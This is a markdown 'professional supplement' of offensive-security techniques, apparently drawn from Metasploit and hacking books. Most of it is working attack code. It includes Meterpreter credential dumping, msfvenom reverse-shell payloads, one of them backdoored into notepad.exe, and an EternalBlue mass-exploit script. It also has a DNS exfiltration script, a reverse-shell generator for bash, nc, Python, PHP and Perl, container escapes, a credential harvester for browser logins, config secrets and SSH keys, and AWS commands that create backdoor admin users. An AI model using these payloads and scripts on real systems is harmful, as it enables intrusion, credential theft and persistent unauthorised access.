# Advanced Cybersecurity Techniques - Professional Supplement
## Enhanced Guide with Content from Leading Security Resources

*Compiled from: Metasploit 2E, Black Hat Bash, Gray Hat Python, and additional professional resources*

---

## Table of Contents
1. [Advanced Metasploit Techniques](#advanced-metasploit-techniques)
2. [Bash Scripting for Offensive Security](#bash-scripting-for-offensive-security)
3. [Python for Security Automation](#python-for-security-automation)
4. [Cloud Penetration Testing](#cloud-penetration-testing)
5. [Advanced Evasion Techniques](#advanced-evasion-techniques)
6. [Microcontroller and IoT Exploitation](#microcontroller-and-iot-exploitation)

---

## Advanced Metasploit Techniques

### Modern Metasploit Framework Architecture

#### Core Components (From Metasploit 2E)
1. **Rex** - Basic library for tasks (protocol connections, string formatting, SSL)
2. **Msf::Core** - Provides the fundamental API
3. **Msf::Base** - Friendly API wrapper
4. **Modules** - Exploit modules, payloads, auxiliary modules

### Advanced Meterpreter Commands

#### Post-Exploitation Best Practices
```bash
# Session management
sessions -l                          # List all sessions
sessions -i 1                        # Interact with session 1
sessions -u 1                        # Upgrade shell to Meterpreter
sessions -K                          # Kill all sessions
sessions -c cmd                      # Run command on all sessions

# Advanced system commands
sysinfo                             # System information
getuid                              # Current user
ps                                  # List processes
getpid                              # Current process ID
migrate <PID>                       # Migrate to another process
execute -f cmd.exe -i -H            # Execute with channel and hidden

# Privilege escalation
getsystem                           # Attempt system privilege
use priv                            # Load privilege extension
getsystem -t 1                      # Named pipe impersonation
getsystem -t 2                      # Named pipe impersonation (RPCSS)
getsystem -t 3                      # Token duplication
getsystem -t 4                      # Named pipe impersonation (PrintSpooler)

# Credential harvesting
hashdump                            # Dump SAM database
load kiwi                           # Load mimikatz extension
kiwi_cmd privilege::debug           # Enable debug privilege
kiwi_cmd sekurlsa::logonpasswords   # Dump credentials
kiwi_cmd lsadump::sam              # Dump SAM
kiwi_cmd lsadump::secrets          # Dump LSA secrets
```

### Advanced Pivoting Techniques

#### Multi-Level Pivoting
```bash
# First hop - compromise initial target
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
exploit

# Setup autoroute
run autoroute -s 10.10.10.0/24      # Add route to internal network
run autoroute -p                     # Print routing table

# Port forwarding
portfwd add -l 3389 -p 3389 -r 10.10.10.50  # Forward RDP
portfwd add -l 445 -p 445 -r 10.10.10.50    # Forward SMB
portfwd list                                 # List port forwards
portfwd delete -l 3389                       # Remove forward

# SOCKS proxy for pivoting
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 4a
run -j

# Configure proxychains
# Edit /etc/proxychains.conf
# socks4 127.0.0.1 1080

# Use through proxy
proxychains nmap -sT -Pn 10.10.10.0/24
proxychains rdesktop 10.10.10.50
```

### Cloud Environment Exploitation (New in 2E)

#### AWS Exploitation
```bash
# Enumerate AWS credentials
search aws                          # Search AWS modules
use post/multi/gather/env          # Gather environment variables
use post/linux/gather/enum_configs # Check config files
use post/cloud/aws/enum_iam        # Enumerate IAM permissions

# AWS credential locations
~/.aws/credentials
~/.aws/config
/var/www/.aws/credentials
Environment variables: AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY

# Privilege escalation in AWS
use post/cloud/aws/enum_iam
use post/cloud/aws/create_user
use post/cloud/aws/assume_role
```

#### Docker Container Escape
```bash
# Check if in container
ls -la /.dockerenv
cat /proc/1/cgroup | grep docker

# Container escape techniques
# 1. Privileged container escape
use post/linux/gather/checkcontainer
use exploit/linux/local/docker_escape

# 2. Mounted Docker socket
ls -la /var/run/docker.sock
# If present, can control Docker daemon
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh

# 3. Capability abuse
capsh --print                       # Check capabilities
# CAP_SYS_ADMIN allows mount, etc.

# 4. cgroup escape
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/exploit" > /tmp/cgrp/release_agent
```

### Advanced Payload Generation with MSFvenom

#### Sophisticated Payload Creation
```bash
# Multiple encoder iterations
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe

# Template injection (hide in legitimate binary)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -x notepad.exe -k -f exe -o notepad_backdoor.exe

# Format-specific payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f asp -o shell.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f aspx -o shell.aspx
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o shell.jsp
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o shell.php

# Platform-specific evasion
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -a x86 --platform windows -o payload.exe

# Stageless payloads (for firewall bypass)
msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell.exe

# Mac OS X payloads
msfvenom -p osx/x86/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f macho -o shell.macho

# Android payloads
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -o malicious.apk
```

### Automation with Resource Scripts

#### Creating Metasploit Resource Scripts
```ruby
# auto_exploit.rc
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.0/24
set THREADS 50
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
set AutoRunScript post/windows/manage/migrate
exploit -j -z

# Usage
msfconsole -r auto_exploit.rc
```

#### Post-Exploitation Automation
```ruby
# auto_post.rc
use post/windows/gather/hashdump
set SESSION 1
run

use post/windows/gather/credentials/credential_collector
set SESSION 1
run

use post/windows/gather/enum_shares
set SESSION 1
run

use post/windows/gather/enum_chrome
set SESSION 1
run
```

### Advanced Active Directory Attacks

#### Kerberos Attacks
```bash
# Kerberoasting
use auxiliary/gather/windows_kerberoast
set SESSION 1
run

# AS-REP Roasting
use auxiliary/gather/windows_as_rep_roast
set SESSION 1
run

# Golden Ticket
use post/windows/escalate/golden_ticket
set SESSION 1
set DOMAIN domain.local
set SID S-1-5-21-...
set KRBTGT_HASH <hash>
run

# Silver Ticket
use post/windows/escalate/silver_ticket
set SESSION 1
set DOMAIN domain.local
set SID S-1-5-21-...
set TARGET target.domain.local
set SERVICE cifs
set HASH <hash>
run
```

#### BloodHound Integration
```bash
# Run SharpHound collector
use post/windows/gather/bloodhound
set SESSION 1
run

# Analyze in BloodHound
# Import JSON files
# Find paths to Domain Admin
# Identify attack paths
```

---

## Bash Scripting for Offensive Security

### Advanced Bash Techniques for Red Team Operations

#### Network Reconnaissance Automation

##### Port Scanning Without Nmap
```bash
#!/bin/bash
# tcp_scanner.sh - Pure bash port scanner

target=$1
start_port=${2:-1}
end_port=${3:-1000}

echo "[*] Scanning $target ports $start_port-$end_port"

for port in $(seq $start_port $end_port); do
    timeout 1 bash -c "echo >/dev/tcp/$target/$port" 2>/dev/null && 
    echo "[+] Port $port is open" &
done
wait

# Usage: ./tcp_scanner.sh 192.168.1.100 1 1000
```

##### DNS Subdomain Enumeration
```bash
#!/bin/bash
# subdomain_enum.sh

domain=$1
wordlist=${2:-/usr/share/wordlists/dns.txt}

echo "[*] Enumerating subdomains for $domain"

while read subdomain; do
    result=$(host "$subdomain.$domain" 2>/dev/null)
    if [[ $result != *"not found"* ]] && [[ -n $result ]]; then
        echo "[+] Found: $subdomain.$domain"
        echo "$result" | grep "has address" | awk '{print $4}'
    fi
done < "$wordlist"
```

##### HTTP Service Discovery
```bash
#!/bin/bash
# web_discovery.sh - Find web services on a network

network=$1  # e.g., 192.168.1.0/24

# Generate IP list
nmap -sn $network -oG - | grep "Up" | awk '{print $2}' > live_hosts.txt

# Check common web ports
echo "[*] Checking for web services..."
while read ip; do
    for port in 80 443 8080 8443 8000 8888; do
        timeout 2 curl -sk -I "http://$ip:$port" 2>/dev/null && 
        echo "[+] http://$ip:$port is responsive" &
        
        timeout 2 curl -sk -I "https://$ip:$port" 2>/dev/null && 
        echo "[+] https://$ip:$port is responsive" &
    done
done < live_hosts.txt
wait
```

#### Data Exfiltration via DNS
```bash
#!/bin/bash
# dns_exfil.sh - Exfiltrate data via DNS queries

file=$1
domain=$2  # Your controlled domain

# Split file into chunks and encode
cat "$file" | xxd -p | tr -d '\n' | fold -w 32 | while read chunk; do
    # Send as DNS query
    dig "$chunk.$domain" @8.8.8.8 +short
    sleep 0.5
done

# On your DNS server, capture queries
# tail -f /var/log/named/query.log | grep $domain
```

#### Reverse Shell Generator
```bash
#!/bin/bash
# shell_gen.sh - Generate various reverse shell payloads

lhost=$1
lport=$2

echo "=== Bash Reverse Shell ==="
echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1"
echo ""

echo "=== Python Reverse Shell ==="
cat << EOF
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$lhost",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
EOF
echo ""

echo "=== Netcat Reverse Shell ==="
echo "nc -e /bin/sh $lhost $lport"
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost $lport >/tmp/f"
echo ""

echo "=== PHP Reverse Shell ==="
echo "php -r '\$sock=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
echo ""

echo "=== Perl Reverse Shell ==="
echo "perl -e 'use Socket;\$i=\"$lhost\";\$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
```

#### Web Application Attack Automation

##### Directory Brute Force
```bash
#!/bin/bash
# web_bruteforce.sh

url=$1
wordlist=${2:-/usr/share/wordlists/dirb/common.txt}
threads=${3:-10}

echo "[*] Fuzzing $url with $threads threads"

# Function to test URL
test_url() {
    path=$1
    response=$(curl -sk -o /dev/null -w "%{http_code}" "$url/$path" 2>/dev/null)
    
    if [[ $response == "200" ]]; then
        echo "[+] Found: $url/$path [200]"
    elif [[ $response == "301" ]] || [[ $response == "302" ]]; then
        echo "[~] Redirect: $url/$path [$response]"
    elif [[ $response == "403" ]]; then
        echo "[!] Forbidden: $url/$path [403]"
    fi
}

export -f test_url
export url

# Parallel processing
cat "$wordlist" | xargs -P $threads -I {} bash -c 'test_url "{}"'
```

##### SQL Injection Tester
```bash
#!/bin/bash
# sqli_test.sh - Basic SQL injection tester

url=$1
param=$2

payloads=(
    "' OR '1'='1"
    "' OR '1'='1'--"
    "' OR '1'='1'/*"
    "admin'--"
    "' UNION SELECT NULL--"
    "1' AND 1=1--"
    "1' AND 1=2--"
)

echo "[*] Testing $url?$param= for SQL injection"

for payload in "${payloads[@]}"; do
    encoded=$(echo -n "$payload" | jq -sRr @uri)
    response=$(curl -sk "$url?$param=$encoded")
    
    if [[ $response == *"error"* ]] || [[ $response == *"syntax"* ]] || [[ $response == *"mysql"* ]]; then
        echo "[+] Possible SQLi with payload: $payload"
        echo "    Response snippet: ${response:0:100}..."
    fi
done
```

#### Privilege Escalation Enumeration Script
```bash
#!/bin/bash
# priv_enum.sh - Linux privilege escalation enumeration

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${GREEN}[*] Linux Privilege Escalation Enumeration${NC}"
echo "=============================================="

# System Information
echo -e "\n${YELLOW}[+] System Information${NC}"
uname -a
cat /etc/*-release
hostname

# Current User
echo -e "\n${YELLOW}[+] Current User${NC}"
id
whoami

# Sudo Privileges
echo -e "\n${YELLOW}[+] Sudo Privileges${NC}"
sudo -l 2>/dev/null

# SUID Files
echo -e "\n${YELLOW}[+] SUID Binaries${NC}"
find / -perm -4000 -type f 2>/dev/null | head -20

# Writable /etc/passwd
echo -e "\n${YELLOW}[+] Checking /etc/passwd writability${NC}"
ls -la /etc/passwd
if [ -w /etc/passwd ]; then
    echo -e "${RED}[!] /etc/passwd is writable!${NC}"
fi

# Cron Jobs
echo -e "\n${YELLOW}[+] Cron Jobs${NC}"
ls -la /etc/cron* 2>/dev/null
cat /etc/crontab 2>/dev/null

# World Writable Directories
echo -e "\n${YELLOW}[+] World Writable Directories in PATH${NC}"
for dir in $(echo $PATH | tr ":" " "); do
    if [ -d "$dir" ] && [ -w "$dir" ]; then
        echo -e "${RED}[!] Writable: $dir${NC}"
    fi
done

# Kernel Version (for exploit search)
echo -e "\n${YELLOW}[+] Kernel Version (check for exploits)${NC}"
uname -r

# Network Information
echo -e "\n${YELLOW}[+] Network Information${NC}"
ip a 2>/dev/null || ifconfig
netstat -tulpn 2>/dev/null | grep LISTEN

# Interesting Files
echo -e "\n${YELLOW}[+] Searching for interesting files${NC}"
find / -name "*.conf" -o -name "*.config" -o -name "*.cnf" 2>/dev/null | grep -v proc | head -20
find / -name "*password*" -o -name "*credential*" 2>/dev/null | grep -v proc | head -20

# Check for Docker
echo -e "\n${YELLOW}[+] Docker Check${NC}"
if [ -S /var/run/docker.sock ]; then
    echo -e "${RED}[!] Docker socket is accessible!${NC}"
    ls -la /var/run/docker.sock
fi

# Capabilities
echo -e "\n${YELLOW}[+] File Capabilities${NC}"
getcap -r / 2>/dev/null
```

#### Living Off the Land - File Transfer Methods
```bash
#!/bin/bash
# lol_transfer.sh - Various file transfer techniques

target_file=$1
destination=$2

echo "[*] File Transfer Methods"
echo "========================="

echo -e "\n[1] Base64 Transfer"
echo "# On target:"
echo "base64 -w 0 $target_file"
echo "# On attacker:"
echo "echo 'BASE64_STRING' | base64 -d > file"

echo -e "\n[2] Netcat Transfer"
echo "# On attacker (listener):"
echo "nc -lvnp 4444 > file"
echo "# On target:"
echo "nc $destination 4444 < $target_file"

echo -e "\n[3] Bash /dev/tcp Transfer"
echo "# On attacker (listener):"
echo "nc -lvnp 4444 > file"
echo "# On target:"
echo "cat $target_file > /dev/tcp/$destination/4444"

echo -e "\n[4] Curl Transfer"
echo "# On attacker:"
echo "python3 -m http.server 80"
echo "# On target:"
echo "curl http://$destination/$target_file -o file"

echo -e "\n[5] Wget Transfer"
echo "# On attacker:"
echo "python3 -m http.server 80"
echo "# On target:"
echo "wget http://$destination/$target_file"

echo -e "\n[6] PHP Transfer"
echo "# On target:"
echo "php -r 'file_put_contents(\"file\", file_get_contents(\"http://$destination/$target_file\"));'"

echo -e "\n[7] Python Transfer"
echo "# On target:"
echo "python -c 'import urllib;urllib.urlretrieve(\"http://$destination/$target_file\", \"file\")'"

echo -e "\n[8] SCP Transfer (if SSH available)"
echo "scp $target_file user@$destination:/tmp/"
```

---

## Python for Security Automation

### Gray Hat Python Techniques

#### Process Injection and Debugging

##### Simple Windows Debugger Framework
```python
#!/usr/bin/env python3
# simple_debugger.py - Basic debugger using ctypes

import sys
import struct
from ctypes import *

# Windows API constants
PROCESS_ALL_ACCESS = 0x1F0FFF
INFINITE = 0xFFFFFFFF
DBG_CONTINUE = 0x00010002

# Load Windows DLLs
kernel32 = windll.kernel32

class STARTUPINFO(Structure):
    _fields_ = [
        ("cb", c_ulong),
        ("lpReserved", c_char_p),
        ("lpDesktop", c_char_p),
        ("lpTitle", c_char_p),
        ("dwX", c_ulong),
        ("dwY", c_ulong),
        ("dwXSize", c_ulong),
        ("dwYSize", c_ulong),
        ("dwXCountChars", c_ulong),
        ("dwYCountChars", c_ulong),
        ("dwFillAttribute", c_ulong),
        ("dwFlags", c_ulong),
        ("wShowWindow", c_short),
        ("cbReserved2", c_short),
        ("lpReserved2", c_void_p),
        ("hStdInput", c_void_p),
        ("hStdOutput", c_void_p),
        ("hStdError", c_void_p),
    ]

class PROCESS_INFORMATION(Structure):
    _fields_ = [
        ("hProcess", c_void_p),
        ("hThread", c_void_p),
        ("dwProcessId", c_ulong),
        ("dwThreadId", c_ulong),
    ]

class SimpleDebugger:
    def __init__(self):
        self.h_process = None
        self.pid = None
        
    def load(self, path_to_exe):
        """Load executable for debugging"""
        creation_flags = 0x00000001  # DEBUG_PROCESS
        
        startupinfo = STARTUPINFO()
        process_information = PROCESS_INFORMATION()
        
        startupinfo.dwFlags = 0x1
        startupinfo.wShowWindow = 0x0
        startupinfo.cb = sizeof(startupinfo)
        
        if kernel32.CreateProcessA(
            path_to_exe.encode(),
            None,
            None,
            None,
            None,
            creation_flags,
            None,
            None,
            byref(startupinfo),
            byref(process_information)):
            
            print(f"[*] Process launched: PID {process_information.dwProcessId}")
            self.h_process = process_information.hProcess
            self.pid = process_information.dwProcessId
        else:
            print("[!] Error launching process")
            
    def run(self):
        """Run the debug loop"""
        while True:
            # Wait for debug event
            # Process debug events
            pass

# Usage
if __name__ == "__main__":
    debugger = SimpleDebugger()
    debugger.load("C:\\Windows\\System32\\notepad.exe")
    debugger.run()
```

#### Network Packet Manipulation
```python
#!/usr/bin/env python3
# packet_sniffer.py - Raw socket packet sniffer

import socket
import struct
import textwrap

def ethernet_frame(data):
    """Parse Ethernet frame"""
    dest_mac, src_mac, proto = struct.unpack('! 6s 6s H', data[:14])
    return get_mac_addr(dest_mac), get_mac_addr(src_mac), socket.htons(proto), data[14:]

def get_mac_addr(bytes_addr):
    """Convert bytes to MAC address format"""
    bytes_str = map('{:02x}'.format, bytes_addr)
    return ':'.join(bytes_str).upper()

def ipv4_packet(data):
    """Parse IPv4 packet"""
    version_header_length = data[0]
    version = version_header_length >> 4
    header_length = (version_header_length & 15) * 4
    ttl, proto, src, target = struct.unpack('! 8x B B 2x 4s 4s', data[:20])
    return version, header_length, ttl, proto, ipv4(src), ipv4(target), data[header_length:]

def ipv4(addr):
    """Convert bytes to IPv4 address"""
    return '.'.join(map(str, addr))

def tcp_segment(data):
    """Parse TCP segment"""
    (src_port, dest_port, sequence, acknowledgment, offset_reserved_flags) = struct.unpack('! H H L L H', data[:14])
    offset = (offset_reserved_flags >> 12) * 4
    flag_urg = (offset_reserved_flags & 32) >> 5
    flag_ack = (offset_reserved_flags & 16) >> 4
    flag_psh = (offset_reserved_flags & 8) >> 3
    flag_rst = (offset_reserved_flags & 4) >> 2
    flag_syn = (offset_reserved_flags & 2) >> 1
    flag_fin = offset_reserved_flags & 1
    return src_port, dest_port, sequence, acknowledgment, flag_urg, flag_ack, flag_psh, flag_rst, flag_syn, flag_fin, data[offset:]

def main():
    """Main packet sniffing loop"""
    # Create raw socket
    conn = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
    
    while True:
        raw_data, addr = conn.recvfrom(65535)
        dest_mac, src_mac, eth_proto, data = ethernet_frame(raw_data)
        print(f'\nEthernet Frame:')
        print(f'Destination: {dest_mac}, Source: {src_mac}, Protocol: {eth_proto}')
        
        # IPv4
        if eth_proto == 8:
            (version, header_length, ttl, proto, src, target, data) = ipv4_packet(data)
            print(f'IPv4 Packet:')
            print(f'Version: {version}, Header Length: {header_length}, TTL: {ttl}')
            print(f'Protocol: {proto}, Source: {src}, Target: {target}')
            
            # TCP
            if proto == 6:
                src_port, dest_port, sequence, acknowledgment, flag_urg, flag_ack, flag_psh, flag_rst, flag_syn, flag_fin, data = tcp_segment(data)
                print(f'TCP Segment:')
                print(f'Source Port: {src_port}, Destination Port: {dest_port}')
                print(f'Sequence: {sequence}, Acknowledgment: {acknowledgment}')
                print(f'Flags: URG: {flag_urg}, ACK: {flag_ack}, PSH: {flag_psh}, RST: {flag_rst}, SYN: {flag_syn}, FIN: {flag_fin}')
                
                if len(data) > 0:
                    print(f'Data:\n{data}')

if __name__ == "__main__":
    main()
```

#### Automated Vulnerability Scanner
```python
#!/usr/bin/env python3
# vuln_scanner.py - Basic web vulnerability scanner

import requests
import re
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup

class VulnScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.visited_urls = set()
        self.vulnerable_urls = []
        
    def get_all_forms(self, url):
        """Extract all forms from URL"""
        try:
            response = requests.get(url, timeout=5)
            soup = BeautifulSoup(response.content, "html.parser")
            return soup.find_all("form")
        except:
            return []
    
    def get_form_details(self, form):
        """Extract form details"""
        details = {}
        action = form.attrs.get("action", "").lower()
        method = form.attrs.get("method", "get").lower()
        inputs = []
        
        for input_tag in form.find_all("input"):
            input_type = input_tag.attrs.get("type", "text")
            input_name = input_tag.attrs.get("name")
            inputs.append({"type": input_type, "name": input_name})
        
        details["action"] = action
        details["method"] = method
        details["inputs"] = inputs
        return details
    
    def test_xss(self, url):
        """Test for XSS vulnerabilities"""
        forms = self.get_all_forms(url)
        print(f"[*] Testing {url} for XSS")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>"
        ]
        
        for form in forms:
            details = self.get_form_details(form)
            
            for payload in xss_payloads:
                data = {}
                for input_tag in details["inputs"]:
                    if input_tag["type"] == "text" or input_tag["type"] == "search":
                        data[input_tag["name"]] = payload
                    else:
                        data[input_tag["name"]] = "test"
                
                # Submit form
                if details["method"] == "post":
                    res = requests.post(urljoin(url, details["action"]), data=data)
                else:
                    res = requests.get(urljoin(url, details["action"]), params=data)
                
                # Check if payload is reflected
                if payload in res.text:
                    print(f"[+] XSS vulnerability found: {url}")
                    print(f"    Form action: {details['action']}")
                    print(f"    Payload: {payload}")
                    self.vulnerable_urls.append(url)
                    break
    
    def test_sqli(self, url):
        """Test for SQL injection vulnerabilities"""
        forms = self.get_all_forms(url)
        print(f"[*] Testing {url} for SQL Injection")
        
        sqli_payloads = [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "admin'--",
            "' UNION SELECT NULL--"
        ]
        
        error_messages = [
            "you have an error in your sql syntax",
            "warning: mysql",
            "unclosed quotation mark",
            "quoted string not properly terminated"
        ]
        
        for form in forms:
            details = self.get_form_details(form)
            
            for payload in sqli_payloads:
                data = {}
                for input_tag in details["inputs"]:
                    if input_tag["type"] == "text" or input_tag["type"] == "password":
                        data[input_tag["name"]] = payload
                    else:
                        data[input_tag["name"]] = "test"
                
                # Submit form
                try:
                    if details["method"] == "post":
                        res = requests.post(urljoin(url, details["action"]), data=data, timeout=5)
                    else:
                        res = requests.get(urljoin(url, details["action"]), params=data, timeout=5)
                    
                    # Check for SQL errors
                    for error in error_messages:
                        if error in res.text.lower():
                            print(f"[+] SQL Injection vulnerability found: {url}")
                            print(f"    Form action: {details['action']}")
                            print(f"    Payload: {payload}")
                            self.vulnerable_urls.append(url)
                            return
                except:
                    pass
    
    def crawl(self, url, depth=2):
        """Crawl website and test for vulnerabilities"""
        if depth == 0 or url in self.visited_urls:
            return
        
        print(f"[*] Crawling: {url}")
        self.visited_urls.add(url)
        
        # Test for vulnerabilities
        self.test_xss(url)
        self.test_sqli(url)
        
        # Extract links
        try:
            response = requests.get(url, timeout=5)
            soup = BeautifulSoup(response.content, "html.parser")
            
            for link in soup.find_all("a"):
                href = link.attrs.get("href")
                if href and href.startswith("http"):
                    if urlparse(href).netloc == urlparse(self.target_url).netloc:
                        self.crawl(href, depth - 1)
        except:
            pass
    
    def scan(self):
        """Start scanning"""
        print(f"[*] Starting scan on {self.target_url}")
        self.crawl(self.target_url)
        
        print(f"\n[*] Scan complete!")
        print(f"[*] Found {len(self.vulnerable_urls)} potential vulnerabilities")
        
        if self.vulnerable_urls:
            print("[+] Vulnerable URLs:")
            for url in set(self.vulnerable_urls):
                print(f"    {url}")

# Usage
if __name__ == "__main__":
    scanner = VulnScanner("http://testphp.vulnweb.com/")
    scanner.scan()
```

#### Credential Harvester
```python
#!/usr/bin/env python3
# cred_harvest.py - Extract credentials from memory/files

import os
import re
import sqlite3
import json
from pathlib import Path

class CredentialHarvester:
    def __init__(self):
        self.credentials = []
        
    def search_browser_passwords(self):
        """Extract saved passwords from browsers"""
        print("[*] Searching for browser credentials...")
        
        # Chrome passwords location
        chrome_path = Path.home() / "AppData/Local/Google/Chrome/User Data/Default/Login Data"
        
        if chrome_path.exists():
            try:
                # Copy database (Chrome locks it)
                import shutil
                temp_db = "temp_login_data"
                shutil.copy2(chrome_path, temp_db)
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                
                for row in cursor.fetchall():
                    url, username, encrypted_password = row
                    if username:
                        self.credentials.append({
                            "source": "Chrome",
                            "url": url,
                            "username": username,
                            "password": "[Encrypted]"
                        })
                        print(f"[+] Found credential: {username}@{url}")
                
                conn.close()
                os.remove(temp_db)
            except Exception as e:
                print(f"[-] Error reading Chrome passwords: {e}")
    
    def search_config_files(self):
        """Search configuration files for credentials"""
        print("[*] Searching configuration files...")
        
        patterns = {
            "password": re.compile(r'password["\']?\s*[:=]\s*["\']([^"\']+)["\']', re.IGNORECASE),
            "api_key": re.compile(r'api[_-]?key["\']?\s*[:=]\s*["\']([^"\']+)["\']', re.IGNORECASE),
            "token": re.compile(r'token["\']?\s*[:=]\s*["\']([^"\']+)["\']', re.IGNORECASE),
            "secret": re.compile(r'secret["\']?\s*[:=]\s*["\']([^"\']+)["\']', re.IGNORECASE),
        }
        
        search_extensions = ['.conf', '.config', '.ini', '.env', '.json', '.xml']
        search_paths = [Path.home(), Path.cwd()]
        
        for search_path in search_paths:
            for root, dirs, files in os.walk(search_path):
                # Skip certain directories
                dirs[:] = [d for d in dirs if d not in ['.git', 'node_modules', '__pycache__']]
                
                for file in files:
                    if any(file.endswith(ext) for ext in search_extensions):
                        file_path = os.path.join(root, file)
                        try:
                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                
                                for cred_type, pattern in patterns.items():
                                    matches = pattern.findall(content)
                                    for match in matches:
                                        self.credentials.append({
                                            "source": "Config File",
                                            "file": file_path,
                                            "type": cred_type,
                                            "value": match
                                        })
                                        print(f"[+] Found {cred_type} in {file_path}")
                        except:
                            pass
    
    def search_ssh_keys(self):
        """Find SSH private keys"""
        print("[*] Searching for SSH keys...")
        
        ssh_path = Path.home() / ".ssh"
        if ssh_path.exists():
            for key_file in ssh_path.glob("id_*"):
                if not key_file.name.endswith(".pub"):
                    self.credentials.append({
                        "source": "SSH Key",
                        "file": str(key_file),
                        "type": "private_key"
                    })
                    print(f"[+] Found SSH private key: {key_file}")
    
    def export_results(self, filename="credentials.json"):
        """Export harvested credentials to JSON"""
        with open(filename, 'w') as f:
            json.dump(self.credentials, f, indent=4)
        print(f"[*] Results exported to {filename}")
    
    def harvest(self):
        """Run all harvesting methods"""
        self.search_browser_passwords()
        self.search_config_files()
        self.search_ssh_keys()
        self.export_results()
        print(f"\n[*] Harvesting complete! Found {len(self.credentials)} items")

# Usage
if __name__ == "__main__":
    harvester = CredentialHarvester()
    harvester.harvest()
```

---

## Cloud Penetration Testing

### AWS Security Assessment

#### IAM Privilege Escalation Paths
```bash
# Common privilege escalation paths in AWS

# 1. Create new user with admin permissions
aws iam create-user --user-name backdoor
aws iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name backdoor

# 2. Assume role with elevated privileges
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/AdminRole --role-session-name test

# 3. Attach admin policy to existing user
aws iam attach-user-policy --user-name current-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 4. Create new policy with wide permissions
aws iam create-policy --policy-name CustomAdmin --policy-document file://admin-policy.json
aws iam attach-user-policy --user-name current-user --policy-arn arn:aws:iam::ACCOUNT:policy/CustomAdmin

# 5. Add user to admin group
aws iam add-user-to-group --user-name current-user --group-name Administrators

# 6. Update existing policy
aws iam create-policy-version --policy-arn arn:aws:iam::ACCOUNT:policy/CustomPolicy --policy-document file://elevated-policy.json --set-as-default

# 7. PassRole and Lambda privilege escalation
aws iam create-role --role-name LambdaAdmin --assume-role-policy-document file://lambda-trust-policy.json
aws iam attach-role-policy --role-name LambdaAdmin --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws lambda create-function --function-name backdoor --runtime python3.9 --role arn:aws:iam::ACCOUNT:role/LambdaAdmin --handler lambda_function.lambda_handler --zip-file fileb://function.zip
```

#### S3 Bucket Enumeration and Exploitation
```bash
# Enumerate S3 buckets
aws s3 ls
aws s3 ls s3://bucket-name
aws s3 ls s3://bucket-name --recursive

# Check bucket permissions
aws s3api get-bucket-acl --bucket bucket-name
aws s3api get-bucket-policy --bucket bucket-name

# Download bucket contents
aws s3 sync s3://bucket-name ./local-folder

# Upload malicious file
echo "malicious content" > backdoor.html
aws s3 cp backdoor.html s3://bucket-name/

# Test public access (without credentials)
curl https://bucket-name.s3.amazonaws.com/
curl https://s3.amazonaws.com/bucket-name/

# Common bucket naming patterns to try
# company-name
# company-backup
# company-data
# company-logs
# company-dev
# company-prod
# company-assets
```

---

*This is Part 1 of the Advanced Techniques Supplement. Additional sections on IoT exploitation, hardware hacking, and advanced evasion techniques will follow.*
